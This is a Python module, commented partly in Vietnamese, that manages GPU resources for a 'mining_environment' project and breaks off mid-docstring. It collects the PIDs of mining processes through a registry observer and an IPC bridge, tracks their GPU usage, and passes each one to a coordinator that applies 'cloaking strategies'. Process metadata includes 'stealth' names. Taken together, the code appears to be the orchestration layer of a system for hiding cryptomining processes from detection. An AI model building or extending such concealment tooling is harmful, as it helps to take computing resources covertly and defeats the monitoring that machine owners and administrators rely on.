"""
GPU Resource Management System with cloaking-only architecture.

Provides centralized GPU resource management, process monitoring,
and cloaking strategy application for mining processes.
"""

import logging
import psutil
import pynvml
import traceback
import threading
import concurrent.futures
import queue
import time
from threading import RLock
from typing import List, Any, Dict, Optional
from pathlib import Path
import os

# Core project imports
from mining_environment.scripts.utils import MiningProcess, CloakRequest, CloakResult
from mining_environment.scripts.cloak_strategies import CloakCoordinator  # NEW: Use coordinator instead of factory
from mining_environment.scripts.auxiliary_modules.interfaces import IResourceManager
from mining_environment.scripts.auxiliary_modules.models import ConfigModel
from mining_environment.scripts.privileged_operations import get_privileged_manager
from mining_environment.scripts.module_loggers import get_resource_manager_logger
from mining_environment.scripts.error_management import get_error_reporter
from mining_environment.scripts.strategy_cache import get_strategy_cache, CacheEvictionPolicy

# Module logger
module_logger = get_resource_manager_logger()

class SharedResourceManager:
    """
    Shared resource manager for GPU operations.
    
    Handles:
    - NVML lifecycle management
    - GPU usage monitoring
    - Cloaking strategy application
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        self.logger = get_resource_manager_logger()
        self.config = config
        self.resource_managers = resource_managers
        
        # Strategy cache initialization
        self.strategy_cache = get_strategy_cache(
            max_size=500,
            ttl_seconds=7200.0,
            eviction_policy=CacheEvictionPolicy.INTELLIGENT
        )
        
        # Privileged operations manager
        self.privileged_manager = get_privileged_manager(logger)
        
        # Security context validation
        security_context = self.privileged_manager.validate_security_context()
        self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")

        # NVML initialization with decoupling - non-blocking if NVML fails
        self._nvml_init = False
        self._nvml_available = False
        
        # Try NVML initialization without throwing exceptions on failure
        try:
            self.initialize_nvml()
            self.logger.info("SharedResourceManager initialized with NVML support")
        except Exception as e:
            self.logger.warning(f"NVML unavailable: {e}")
            self.logger.info("SharedResourceManager operating in fallback mode (no NVML)")
            # Continue without raising exception - system continues with limited functionality

    def is_nvml_initialized(self) -> bool:
        return self._nvml_init

    def initialize_nvml(self) -> None:
        """Thread-safe NVML initialization"""
        if self._nvml_init:
            return

        try:
            def nvml_init_worker():
                pynvml.nvmlInit()
                return True

            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
                future = executor.submit(nvml_init_worker)
                try:
                    # Reduced timeout to prevent long blocking
                    timeout = getattr(self.config, 'nvml_init_timeout', 2.0) 
                    result = future.result(timeout=timeout)
                    if result:
                        self._nvml_init = True
                        self._nvml_available = True
                        self.logger.info("NVML initialization successful")
                except concurrent.futures.TimeoutError:
                    self.logger.warning("NVML initialization timeout")
                    raise
        except Exception as e:
            self.logger.error(f"NVML initialization failed: {e}")
            raise

    def shutdown_nvml(self):
        """**Safe NVML Shutdown** (tắt NVML an toàn)"""
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.info("NVML đã tắt")
            except Exception as e:
                self.logger.error(f"Lỗi tắt NVML: {e}")

    def get_process_cache_usage(self, pid: int) -> float:
        """**Get Process Cache Usage** (lấy cache usage của process)"""
        try:
            if not self._nvml_init:
                return 0.0
                
            process = psutil.Process(pid)
            memory_info = process.memory_info()
            return float(memory_info.rss) / (1024 * 1024)  # MB
        except Exception as e:
            self.logger.debug(f"Không thể lấy cache usage cho PID {pid}: {e}")
            return 0.0

    def get_gpu_usage_percent(self, pid: int) -> float:
        """**Get GPU Usage Percent** (lấy phần trăm sử dụng GPU)"""
        return self._sync_get_gpu_usage_percent(pid)

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        """**Synchronous GPU Usage Check** (kiểm tra sử dụng GPU đồng bộ)"""
        try:
            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                processes = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                
                for proc in processes:
                    if proc.pid == pid:
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        return float(utilization.gpu)
            return 0.0
        except Exception as e:
            self.logger.debug(f"Không thể lấy GPU usage cho PID {pid}: {e}")
            return 0.0

class ResourceManager(IResourceManager):
    """
    **Main Resource Manager Class** (lớp quản lý tài nguyên chính)
    
    **Simplified Architecture** (kiến trúc đơn giản hóa):
    - DirectPIDRegistry Observer-Based Cloaking
    - No Process Discovery or Monitoring  
    - Thread-Safe Singleton Pattern
    """

    _instance = None
    _instance_lock = threading.Lock()
    _ready_event = threading.Event()
    _initialization_lock = threading.RLock()

    def __new__(cls, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """**Singleton Creation** (tạo singleton)"""
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
                module_logger.debug("ResourceManager Singleton Created")
        return cls._instance

    def __init__(self, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """**Initialize ResourceManager** (khởi tạo ResourceManager)"""
        if getattr(self, '_initialized', False):
            module_logger.debug("ResourceManager Singleton Already Initialized")
            return

        with self._initialization_lock:
            if getattr(self, '_initialized', False):
                return

            self.logger = get_resource_manager_logger()
            self.config = self._validate_configuration(config)
            
            # **Core Components** (thành phần cốt lõi)
            self._stop_flag = False
            self.workers = []
            self.resource_adjustment_queue = queue.Queue()
            
            # **🥇 SOLUTION D: EAGER INITIALIZATION FIX** (khởi tạo eager SharedResourceManager)
            # Khởi tạo SharedResourceManager ngay lập tức để tránh race condition
            self._shared_resource_manager_lock = threading.Lock()
            self._shared_resource_manager_init_attempted = False
            
            # **🥇 SOLUTION D: Eager initialization với error handling** (khởi tạo eager với xử lý lỗi)
            try:
                self.logger.info("🔧 [EAGER-INIT] Bắt đầu khởi tạo SharedResourceManager...")
                resource_managers = {'main': self}
                self.shared_resource_manager = SharedResourceManager(
                    self.config, self.logger, resource_managers
                )
                self.logger.info("✅ [EAGER-INIT] SharedResourceManager khởi tạo thành công")
                
                # **🥇 SOLUTION D: Signal ready sau khi SharedResourceManager sẵn sàng** (báo hiệu sẵn sàng)
                self.signal_ready()
                self.logger.info("✅ [EAGER-INIT] ResourceManager đã sẵn sàng nhận PID")
                
            except Exception as e:
                self.logger.warning(f"⚠️ [EAGER-INIT] SharedResourceManager khởi tạo thất bại: {e}")
                self.logger.info("🔄 [EAGER-INIT] Hệ thống sẽ hoạt động ở chế độ giới hạn")
                self.shared_resource_manager = None
                # Vẫn signal ready để không block hệ thống
                self.signal_ready()
            
            # **🥇 SOLUTION 1: Add Persistent Service Architecture** (thêm kiến trúc service liên tục)
            self._pid_queue = queue.Queue()  # Queue for incoming PIDs from registry
            self._monitored_processes = {}   # Dict[int, MiningProcess] - processes under cloaking
            self._monitoring_interval = 30.0  # Monitor every 30 seconds
            self._last_monitoring_cycle = 0.0
            self._cloaking_stats = {
                'processes_cloaked': 0,
                'cloaking_attempts': 0,
                'failed_cloakings': 0,
                'monitoring_cycles': 0
            }
            
            # **File-based scanner deprecated** (scanner dựa trên file đã deprecated)
            # Replaced by IPC Bridge for cross-process communication
            
            # **DirectPIDRegistry Integration** (tích hợp DirectPIDRegistry)
            self._setup_direct_registry_observer()
            
            # **🔥 IPC BRIDGE INTEGRATION** (tích hợp IPC Bridge)
            self._ipc_server = None
            self._ipc_enabled = True
            self._ipc_stats = {
                'messages_received': 0,
                'pid_forwards_handled': 0,
                'ipc_errors': 0,
                'cross_process_requests': 0
            }
            self._setup_ipc_bridge()
            
            self._initialized = True
            module_logger.info("ResourceManager khởi tạo thành công")

    @classmethod
    def wait_for_ready(cls, timeout: float = 10.0) -> bool:
        """**Wait for ResourceManager Ready** (chờ ResourceManager sẵn sàng)"""
        try:
            return cls._ready_event.wait(timeout=timeout)
        except Exception as e:
            module_logger.error(f"Lỗi chờ ResourceManager ready: {e}")
            return False

    @classmethod
    def is_ready(cls) -> bool:
        """**Check if ResourceManager is Ready** (kiểm tra ResourceManager sẵn sàng)"""
        return cls._ready_event.is_set()

    @classmethod
    def signal_ready(cls):
        """**Signal ResourceManager Ready** (báo hiệu ResourceManager sẵn sàng)"""
        cls._ready_event.set()
        module_logger.info("ResourceManager Ready Signal Set")

    @classmethod
    def clear_ready_signal(cls):
        """**Clear ResourceManager Ready Signal** (xóa tín hiệu sẵn sàng)"""
        cls._ready_event.clear()
        module_logger.info("ResourceManager Ready Signal Cleared")

    def _validate_configuration(self, config: ConfigModel) -> ConfigModel:
        """**Validate Configuration** (xác thực cấu hình)"""
        if not config:
            raise ValueError("Configuration không được None")
        
        # **Cloaking Strategies Validation** (xác thực chiến lược che giấu)
        if not hasattr(config, 'cloaking_strategies') or not config.cloaking_strategies:
            self.logger.warning("Không có cloaking strategies, sử dụng mặc định")
            
        return config

    def is_gpu_initialized(self) -> bool:
        """**Check GPU Initialization** (kiểm tra khởi tạo GPU)"""
        return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()


    def _ensure_shared_resource_manager(self) -> bool:
        """**Lazy Initialize SharedResourceManager** (khởi tạo lười SharedResourceManager)
        
        Chỉ khởi tạo SharedResourceManager khi thực sự cần dùng.
        Sử dụng lock để tránh race condition khi nhiều thread gọi cùng lúc.
        
        Returns:
            bool: True nếu SharedResourceManager sẵn sàng, False nếu không
        """
        # Fast path: đã khởi tạo rồi
        if self.shared_resource_manager is not None:
            return True
            
        # Slow path: cần khởi tạo
        with self._shared_resource_manager_lock:
            # Double-check pattern
            if self.shared_resource_manager is not None:
                return True
                
            # Chỉ thử một lần để tránh block lâu
            if self._shared_resource_manager_init_attempted:
                return False
                
            self._shared_resource_manager_init_attempted = True
            self.logger.info("🔧 [LAZY-INIT] Bắt đầu khởi tạo SharedResourceManager...")
            
            try:
                # Thử khởi tạo với timeout ngắn
                resource_managers = {'main': self}
                self.shared_resource_manager = SharedResourceManager(
                    self.config, self.logger, resource_managers
                )
                self.logger.info("✅ [LAZY-INIT] SharedResourceManager khởi tạo thành công")
                return True
                
            except Exception as e:
                self.logger.warning(f"⚠️ [LAZY-INIT] SharedResourceManager khởi tạo thất bại: {e}")
                self.logger.info("🔄 [LAZY-INIT] Hệ thống sẽ hoạt động ở chế độ giới hạn")
                self.shared_resource_manager = None
                return False
    
    def _setup_direct_registry_observer(self):
        """**Setup DirectPIDRegistry Observer** (thiết lập observer DirectPIDRegistry)"""
        try:
            from pid_logger.direct_registry import get_direct_registry
            
            registry = get_direct_registry()
            
            # **SOLUTION 1: Register ResourceManager instance với DirectPIDRegistry** (đăng ký instance ResourceManager)
            if hasattr(registry, 'register_resource_manager'):
                success = registry.register_resource_manager(self)
                if success:
                    self.logger.info("✅ [SOLUTION-1] ResourceManager đã đăng ký với DirectPIDRegistry")
                else:
                    self.logger.warning("⚠️ [SOLUTION-1] Không thể đăng ký ResourceManager với DirectPIDRegistry")
            else:
                self.logger.warning("⚠️ [SOLUTION-1] DirectPIDRegistry không hỗ trợ register_resource_manager")
            
            # **Original observer registration** (đăng ký observer gốc)
            registry.register_observer(self._on_process_registered_direct)
            self.logger.info("✅ DirectPIDRegistry observer đã đăng ký")
            
        except Exception as e:
            self.logger.error(f"❌ Lỗi thiết lập DirectPIDRegistry: {e}")

    def _setup_ipc_bridge(self):
        """
        **🔥 Setup IPC Bridge Server** (thiết lập máy chủ IPC Bridge)
        
        Khởi tạo IPC Server để nhận PID forwards từ cross-process DirectPIDRegistry.
        Thay thế singleton access patterns bằng reliable message passing.
        """
        try:
            self.logger.info("🌉 [IPC-BRIDGE] Setting up IPC Bridge server...")
            
            # **Import IPC Bridge components** (nhập các thành phần IPC Bridge)
            try:
                from mining_environment.scripts.ipc_bridge import create_ipc_server, IPCMessageType
                self.logger.info("✅ [IPC-BRIDGE] IPC Bridge modules imported successfully")
            except ImportError as ie:
                self.logger.error(f"❌ [IPC-BRIDGE] Failed to import IPC Bridge: {ie}")
                self._ipc_enabled = False
                return False
                
            # **Create IPC Server instance** (tạo instance IPC Server)
            self._ipc_server = create_ipc_server()
            
            # **Register PID forward callback** (đăng ký callback chuyển tiếp PID)
            success = self._ipc_server.register_callback(
                IPCMessageType.PID_FORWARD, 
                self._handle_ipc_pid_forward
            )
            
            if not success:
                self.logger.error("❌ [IPC-BRIDGE] Failed to register PID forward callback")
                self._ipc_enabled = False
                return False
            
            # **Register status check callback** (đăng ký callback kiểm tra trạng thái)
            self._ipc_server.register_callback(
                IPCMessageType.STATUS_CHECK,
                self._handle_ipc_status_check
            )
            
            # **Start IPC Server** (khởi động IPC Server)
            server_started = self._ipc_server.start()
            
            if server_started:
                self.logger.info("✅ [IPC-BRIDGE] IPC Bridge server started successfully")
                self.logger.info("🔗 [IPC-BRIDGE] Ready to receive cross-process PID forwards")
                return True
            else:
                self.logger.error("❌ [IPC-BRIDGE] Failed to start IPC Bridge server")
                self._ipc_enabled = False
                return False
                
        except Exception as e:
            self.logger.error(f"❌ [IPC-BRIDGE] Error setting up IPC Bridge: {e}")
            self.logger.error(f"🔍 [IPC-BRIDGE] Traceback: {traceback.format_exc()}")
            self._ipc_enabled = False
            return False
    
    def _handle_ipc_pid_forward(self, ipc_message) -> bool:
        """
        **🔥 Handle IPC PID Forward** (xử lý chuyển tiếp PID qua IPC)
        
        CRITICAL METHOD: Cross-process PID forward handler thay thế singleton access.
        Nhận PID từ subprocess DirectPIDRegistry và trigger cloaking trong main process.
        
        Args:
            ipc_message: IPCMessage chứa PID và metadata
            
        Returns:
            bool: True nếu xử lý thành công
        """
        try:
            start_time = time.time()
            self.logger.info(f"🎯 [IPC-HANDLER] Received cross-process PID forward: {ipc_message.message_id[:8]}")
            
            # **Update IPC statistics** (cập nhật thống kê IPC)
            self._ipc_stats['messages_received'] += 1
            self._ipc_stats['cross_process_requests'] += 1
            
            # **Extract PID and metadata from message** (trích xuất PID và metadata từ tin nhắn)
            payload = ipc_message.payload
            pid = payload.get('pid')
            metadata = payload.get('metadata', {})
            source = payload.get('source', 'ipc_bridge')
            
            if not pid:
                self.logger.error("❌ [IPC-HANDLER] No PID in message payload")
                self._ipc_stats['ipc_errors'] += 1
                return False
                
            self.logger.info(f"📍 [IPC-HANDLER] Processing cross-process PID {pid}")
            self.logger.debug(f"🔍 [IPC-HANDLER] Message metadata keys: {list(metadata.keys())}")
            
            # **Create MiningProcess object** (tạo đối tượng MiningProcess)
            process_name = metadata.get('stealth_name', metadata.get('process_name', f'process_{pid}'))
            cmd = metadata.get('cmd', [])
            
            mining_process = MiningProcess(
                pid=pid,
                name=process_name,
                cmd=cmd
            )
            
            self.logger.info(f"🔧 [IPC-HANDLER] Created MiningProcess: {mining_process.name}")
            
            # **Add IPC metadata for tracking** (thêm metadata IPC để tracking)
            enhanced_metadata = {
                **metadata,
                'ipc_timestamp': time.time(),
                'ipc_message_id': ipc_message.message_id,
                'ipc_source_process': ipc_message.source_process,
                'cross_process_forward': True,
                'original_source': source
            }
            
            # **Queue PID for processing** (queue PID để xử lý)
            pid_data = {
                'pid': pid,
                'mining_process': mining_process,
                'registry_metadata': enhanced_metadata,
                'timestamp': time.time(),
                'source': 'ipc_bridge_forward',
                'ipc_enabled': True,
                'message_id': ipc_message.message_id
            }
            
            try:
                self._pid_queue.put(pid_data, block=False)
                self.logger.info(f"✅ [IPC-HANDLER] PID {pid} queued for processing via IPC")
                
                # **Update success statistics** (cập nhật thống kê thành công)
                self._ipc_stats['pid_forwards_handled'] += 1
                
                # **Log performance metrics** (ghi log metrics hiệu suất)
                processing_time_ms = (time.time() - start_time) * 1000
                self.logger.debug(f"⚡ [IPC-PERF] PID forward handled in {processing_time_ms:.1f}ms")
                
                return True
                
            except queue.Full:
                self.logger.warning(f"⚠️ [IPC-HANDLER] PID queue full, processing immediately for PID {pid}")
                
                # **Immediate processing fallback** (dự phòng xử lý ngay lập tức)
                success = self._process_pid_immediately(pid_data)
                self.logger.info(f"📊 [IPC-HANDLER] Immediate processing result for PID {pid}: {success}")
                
                if success:
                    self._ipc_stats['pid_forwards_handled'] += 1
                else:
                    self._ipc_stats['ipc_errors'] += 1
                
                return success
                
        except Exception as e:
            self.logger.error(f"❌ [IPC-HANDLER] Error handling PID forward: {e}")
            self.logger.error(f"🔍 [IPC-HANDLER] Traceback: {traceback.format_exc()}")
            self._ipc_stats['ipc_errors'] += 1
            return False
    
    def _handle_ipc_status_check(self, ipc_message) -> bool:
        """
        **🔥 Handle IPC Status Check** (xử lý kiểm tra trạng thái IPC)
        
        Handle status check requests từ IPC clients.
        
        Args:
            ipc_message: IPCMessage với status check request
            
        Returns:
            bool: True nếu xử lý thành công
        """
        try:
            self.logger.debug(f"📊 [IPC-STATUS] Status check request: {ipc_message.message_id[:8]}")
            
            # **Prepare status response** (chuẩn bị phản hồi trạng thái)
            status_info = {
                'resource_manager_ready': self.is_ready(),
                'shared_resource_manager_available': self.shared_resource_manager is not None,
                'ipc_enabled': self._ipc_enabled,
                'ipc_stats': self._ipc_stats.copy(),
                'monitored_processes': len(self._monitored_processes),
                'queue_size': self._pid_queue.qsize(),
                'response_timestamp': time.time()
            }
            
            self.logger.debug(f"📈 [IPC-STATUS] Status response: ResourceManager ready={status_info['resource_manager_ready']}")
            self.logger.debug(f"📈 [IPC-STATUS] IPC stats: {self._ipc_stats}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [IPC-STATUS] Error handling status check: {e}")
            return False

    def _on_process_registered_direct(self, process_info) -> None:
        """**Handle Process Registration** (xử lý đăng ký process)"""
        try:
            self.logger.info(f"🎯 [OBSERVER-CALLBACK] _on_process_registered_direct called with process_info: {process_info}")
            
            # ProcessInfo is a dataclass, not a dict - access attributes directly
            if not hasattr(process_info, 'pid'):
                self.logger.warning("ProcessInfo missing pid attribute")
                return
                
            pid = process_info.pid
            if not pid:
                self.logger.warning(f"ProcessInfo has empty pid: {process_info}")
                return
            
            self.logger.info(f"📍 [OBSERVER-CALLBACK] Processing PID {pid} from DirectPIDRegistry")

            # **Create MiningProcess** (tạo MiningProcess)
            # Extract cmd from metadata if available, otherwise use empty list
            cmd = []
            if hasattr(process_info, 'metadata') and process_info.metadata:
                cmd = process_info.metadata.get('cmd', [])
                
            mining_process = MiningProcess(
                pid=pid,
                name=process_info.process_name if hasattr(process_info, 'process_name') else f'process_{pid}',
                cmd=cmd
            )

            # **Trigger Cloaking** (kích hoạt che giấu)
            self.logger.info(f"🚀 [OBSERVER-CALLBACK] About to trigger cloaking for PID {pid}")
            self.trigger_cloaking(mining_process, 'direct_registry')
            self.logger.info(f"✅ [OBSERVER-CALLBACK] Cloaking triggered successfully for PID {pid}")
            
        except Exception as e:
            self.logger.error(f"Lỗi xử lý process registration: {e}")

    def trigger_cloaking(self, process: MiningProcess, source: str = 'unknown') -> bool:
        """
        Kích hoạt cloaking cho một `MiningProcess`.

        Stage 1 (ResourceManager):
        • Tạo `CloakRequest` tối thiểu chỉ chứa `pid` + `metadata`.
        • Forward trực tiếp sang `CloakCoordinator` (Stage 2) – nơi quyết định strategy và chuẩn bị tham số.

        Parameters
        ----------
        process : MiningProcess
            Tiến trình cần cloaking.
        source : str, optional
            Nguồn gọi cloaking (observer/file scanner…), mặc định "unknown".

        Returns
        -------
        bool
            `True` nếu cloaking thành công, ngược lại `False`.
        """
        try:
            self.logger.info(
                f"[RM] Stage 1: Trigger cloaking for PID {process.pid} (source={source})"
            )

            # Lazy-init coordinator
            if not hasattr(self, "cloak_coordinator"):
                self.cloak_coordinator = CloakCoordinator(self.config)
                self.logger.info("[RM] Initialized CloakCoordinator")

            # Build minimal request (Stage 1)
            request = CloakRequest(
                pid=process.pid,
                strategy_name=None,  # Stage 2 sẽ quyết định
                params={},
                metadata={"source": source, "process_name": process.name},
            )

            self.logger.debug(f"[RM] Built CloakRequest: {request.to_dict()}")

            # Forward to Stage 2 – Coordinator
            result = self.cloak_coordinator.process_request(request)

            if result.success:
                self.logger.info(f"[RM] ✅ Cloaking successful for PID {process.pid}")
                self.logger.debug(f"[RM] Applied controls: {result.applied_controls}")
            else:
                self.logger.error(f"[RM] ❌ Cloaking failed: {result.error_msg}")

            return result.success

        except Exception as e:
            self.logger.error(f"[RM] Exception in trigger_cloaking: {e}")
            import traceback
            self.logger.debug(f"[RM] Traceback: {traceback.format_exc()}")
            return False

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """**Collect Process Metrics** (thu thập metrics của process)"""
        metrics = {
            'timestamp': time.time(),
            'pid': process.pid,
            'name': process.name
        }
        
        try:
            if self.shared_resource_manager:
                metrics['gpu_usage'] = self.shared_resource_manager.get_gpu_usage_percent(process.pid)
                metrics['cache_usage'] = self.shared_resource_manager.get_process_cache_usage(process.pid)
        except Exception as e:
            self.logger.debug(f"Lỗi thu thập metrics cho PID {process.pid}: {e}")
            
        return metrics

    def start(self):
        """**TIER 1 FIX: Enhanced ResourceManager Start** (khởi động ResourceManager nâng cao)"""
        try:
            self.logger.info("🚀 [TIER-1] Khởi động ResourceManager với enhanced initialization...")
            
            # **TIER 1 FIX: Validate prerequisites** (xác thực điều kiện tiên quyết)
            if not self.config:
                raise ValueError("Configuration missing - cannot start ResourceManager")
            
            # **🥇 CRITICAL FIX: Check if SharedResourceManager already initialized trong __init__** 
            if self.shared_resource_manager is not None:
                self.logger.info("✅ [CRITICAL] SharedResourceManager đã được khởi tạo trong __init__, skip initialization trong start()")
            else:
                # **TIER 1 FIX: Retry SharedResourceManager initialization trong start()** (thử lại khởi tạo SharedResourceManager trong start())
                self.logger.info("🔧 [TIER-1] SharedResourceManager chưa được khởi tạo, retry trong start()...")
                resource_managers = {'main': self}
                
                try:
                    self.shared_resource_manager = SharedResourceManager(
                        self.config, self.logger, resource_managers
                    )
                    self.logger.info("✅ [TIER-1] SharedResourceManager retry initialization successful")
                    
                except Exception as srm_error:
                    self.logger.error(f"❌ [TIER-1] SharedResourceManager retry initialization failed: {srm_error}")
                    raise RuntimeError(f"Failed to initialize SharedResourceManager trong start(): {srm_error}")
            
            # **TIER 1 FIX: Final Validation** (xác thực cuối cùng)
            if self.shared_resource_manager is None:
                raise RuntimeError("Critical validation failed: SharedResourceManager is None after initialization")
            
            # **Start Worker Threads** (khởi động worker threads)
            self.logger.info("⚙️ [TIER-1] Starting worker threads...")
            self._start_workers()
            
            # **DirectPIDRegistry Observer** (DirectPIDRegistry observer đã được thiết lập trong __init__)
            # Process discovery sẽ được xử lý thông qua DirectPIDRegistry callbacks
            
            # **TIER 1 FIX: Enhanced Ready Signal with validation** (tín hiệu sẵn sàng nâng cao với xác thực)
            self.logger.info("🎯 [TIER-1] Signaling ResourceManager ready...")
            self.signal_ready()
            
            # **TIER 1 FIX: Final validation** (xác thực cuối cùng)
            if self.shared_resource_manager is None:
                raise RuntimeError("Critical validation failed: SharedResourceManager is None after initialization")
            
            self.logger.info("✅ [TIER-1] ResourceManager đã khởi động thành công với SharedResourceManager")
            self.logger.info(f"🔍 [TIER-1] SharedResourceManager status: {self.shared_resource_manager is not None}")
            
        except Exception as e:
            self.logger.error(f"❌ [TIER-1] Lỗi khởi động ResourceManager: {e}")
            self.logger.error(f"🔍 [TIER-1] SharedResourceManager status: {getattr(self, 'shared_resource_manager', 'Not initialized')}")
            raise

    def _start_workers(self):
        """**Start Worker Threads** (khởi động worker threads)"""

        # **🥇 SOLUTION 1: Add Persistent Monitoring Thread** (thêm thread giám sát liên tục)
        monitoring_worker = threading.Thread(
            target=self._persistent_monitoring_loop,
            name="ResourceManagerMonitoring",
            daemon=True
        )
        monitoring_worker.start()
        self.workers.append(monitoring_worker)
        
        # **🥇 SOLUTION 1: Add PID Processing Thread** (thêm thread xử lý PID)
        pid_worker = threading.Thread(
            target=self._pid_processing_loop,
            name="PIDProcessingWorker",
            daemon=True
        )
        pid_worker.start()
        self.workers.append(pid_worker)
        
        # File-based PID scanner deprecated and fully removed in Phase 4
        
        self.logger.info(f"Worker threads đã khởi động: {len(self.workers)} threads active")

    def shutdown(self):
        """**Shutdown ResourceManager** (tắt ResourceManager)"""
        self.logger.info("Tắt ResourceManager...")
        
        # **Clear Ready Signal** (xóa tín hiệu sẵn sàng)
        self.clear_ready_signal()

        # **Wait for Queue** (chờ queue)
        try:
            self.resource_adjustment_queue.join()
        except Exception as e:
            self.logger.error(f"Lỗi chờ queue: {e}")

        # **Set Stop Flag** (đặt cờ dừng)
        self._stop_flag = True

        # **Wait for Workers** (chờ workers)
        for worker in self.workers:
            try:
                worker.join(timeout=5.0)
                if worker.is_alive():
                    self.logger.warning(f"Worker {worker.name} vẫn đang chạy")
            except Exception as e:
                self.logger.error(f"Lỗi join worker {worker.name}: {e}")

        # **🔥 Shutdown IPC Bridge Server** (tắt máy chủ IPC Bridge)
        if self._ipc_server and self._ipc_enabled:
            try:
                self.logger.info("🌉 [IPC-BRIDGE] Shutting down IPC Bridge server...")
                self._ipc_server.stop()
                self.logger.info("✅ [IPC-BRIDGE] IPC Bridge server stopped")
            except Exception as e:
                self.logger.error(f"❌ [IPC-BRIDGE] Error shutting down IPC server: {e}")
        
        # **Shutdown NVML** (tắt NVML)
        if self.shared_resource_manager:
            try:
                self.shared_resource_manager.shutdown_nvml()
            except Exception as e:
                self.logger.error(f"Lỗi tắt NVML: {e}")

        self.logger.info("ResourceManager đã tắt")

    def receive_from_registry(self, pid: int, registry_metadata: Dict[str, Any]) -> bool:
        """
        **TIER 2 FIX: Enhanced Receive PID from DirectPIDRegistry** (nhận PID từ DirectPIDRegistry nâng cao)
        
        **Critical Interface Method** (phương thức giao diện quan trọng) cho DirectPIDRegistry → ResourceManager handoff.
        
        Args:
            pid: Process ID to apply cloaking
            registry_metadata: Metadata from DirectPIDRegistry
            
        Returns:
            bool: True if cloaking successfully triggered
        """
        try:
            self.logger.info(f"🎯 [TIER-2] receive_from_registry called for PID {pid}")
            self.logger.info(f"🔍 [TIER-2] Registry metadata keys: {list(registry_metadata.keys())}")
            
            # **🥇 CRITICAL FIX: SharedResourceManager should be available từ __init__** (SharedResourceManager nên có sẵn từ __init__)
            if not self.shared_resource_manager:
                self.logger.error(f"❌ [CRITICAL] SharedResourceManager is None trong receive_from_registry cho PID {pid} - this should not happen with __init__ initialization!")
                return False
            else:
                self.logger.info(f"✅ [CRITICAL] SharedResourceManager is available in receive_from_registry")
            
            # **TIER 2 FIX: Enhanced MiningProcess creation** (tạo đối tượng MiningProcess nâng cao)
            self.logger.info(f"🔧 [TIER-2] Creating MiningProcess object for PID {pid}")
            mining_process = MiningProcess(
                pid=pid,
                name=registry_metadata.get('name', f'process_{pid}'),
                cmd=registry_metadata.get('cmd', [])
            )
            self.logger.info(f"✅ [TIER-2] MiningProcess created: {mining_process.name}")
            
            # **TIER 2 FIX: Enhanced PID queue processing** (xử lý queue PID nâng cao)
            pid_data = {
                'pid': pid,
                'mining_process': mining_process,
                'registry_metadata': registry_metadata,
                'timestamp': time.time(),
                'source': 'direct_registry_handoff',
                'tier2_enhanced': True
            }
            
            try:
                self._pid_queue.put(pid_data, block=False)
                self.logger.info(f"✅ [TIER-2] PID {pid} queued for processing successfully")
                return True
            except queue.Full:
                self.logger.warning(f"⚠️ [TIER-2] PID queue full, processing immediately for PID {pid}")
                # **TIER 2 FIX: Enhanced immediate processing** (xử lý ngay lập tức nâng cao)
                success = self._process_pid_immediately(pid_data)
                self.logger.info(f"📊 [TIER-2] Immediate processing result for PID {pid}: {success}")
                return success
            
        except Exception as e:
            self.logger.error(f"❌ [TIER-2] Lỗi xử lý PID {pid} trong receive_from_registry: {e}")
            self.logger.error(f"🔍 [TIER-2] Registry metadata: {registry_metadata}")
            import traceback
            self.logger.error(f"📋 [TIER-2] Full traceback: {traceback.format_exc()}")
            return False

    def _persistent_monitoring_loop(self):
        """
        **🥇 SOLUTION 1: Persistent Monitoring Loop** (vòng lặp giám sát liên tục)
        
        Continuous monitoring thread thay thế one-shot initialization.
        Monitors cloaked processes và ensures cloaking effectiveness.
        """
        self.logger.info("🔄 [PERSISTENT] ResourceManager monitoring loop started")
        
        while not self._stop_flag:
            try:
                current_time = time.time()
                
                # **Monitor cloaked processes** (giám sát processes đã cloaked)
                if current_time - self._last_monitoring_cycle >= self._monitoring_interval:
                    self._execute_monitoring_cycle(current_time)
                    self._last_monitoring_cycle = current_time
                    self._cloaking_stats['monitoring_cycles'] += 1
                
                # **Health check** (kiểm tra sức khỏe)
                if len(self._monitored_processes) > 0:
                    self.logger.debug(f"🔍 [PERSISTENT] Monitoring {len(self._monitored_processes)} processes")
                
                time.sleep(5.0)  # Check every 5 seconds
                
            except Exception as e:
                self.logger.error(f"❌ [PERSISTENT] Monitoring loop error: {e}")
                time.sleep(10.0)  # Wait longer on error
        
        self.logger.info("🔚 [PERSISTENT] ResourceManager monitoring loop stopped")
    
    def _pid_processing_loop(self):
        """
        **🥇 SOLUTION 1: PID Processing Loop** (vòng lặp xử lý PID)
        
        Continuous PID processing thread.
        Processes queued PIDs từ DirectPIDRegistry và applies cloaking.
        """
        self.logger.info("🔄 [PID-PROC] PID processing loop started")
        
        while not self._stop_flag:
            try:
                # **Get PID from queue** (lấy PID từ queue)
                try:
                    pid_data = self._pid_queue.get(timeout=2.0)
                except queue.Empty:
                    continue
                
                # **Process PID** (xử lý PID)
                success = self._process_pid_immediately(pid_data)
                
                if success:
                    self.logger.info(f"✅ [PID-PROC] Successfully processed PID {pid_data['pid']}")
                else:
                    self.logger.error(f"❌ [PID-PROC] Failed to process PID {pid_data['pid']}")
                
                self._pid_queue.task_done()
                
            except Exception as e:
                self.logger.error(f"❌ [PID-PROC] Processing loop error: {e}")
                time.sleep(1.0)
        
        self.logger.info("🔚 [PID-PROC] PID processing loop stopped")
    
    def _process_pid_immediately(self, pid_data: Dict[str, Any]) -> bool:
        """
        **🥇 SOLUTION 1: Immediate PID Processing** (xử lý PID tức thì)
        
